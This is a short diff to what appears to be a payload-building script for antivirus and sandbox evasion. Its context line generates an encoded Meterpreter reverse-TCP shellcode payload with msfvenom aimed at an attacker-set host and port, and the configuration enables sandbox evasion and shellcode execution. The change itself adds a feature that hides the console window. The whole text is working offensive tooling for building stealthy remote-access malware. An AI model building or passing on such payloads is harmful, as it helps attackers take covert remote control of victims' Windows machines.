@@ -26,6 +26,9 @@ msfvenom -p windows/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x86/shi
 # add fopen sandbox evasion feature
 add_feature fopen_sandbox_evasion
 
+# hide console window
+add_feature hide_console
+
 # set shellcode binding technique
 shellcode_binding exec_shellcode
 
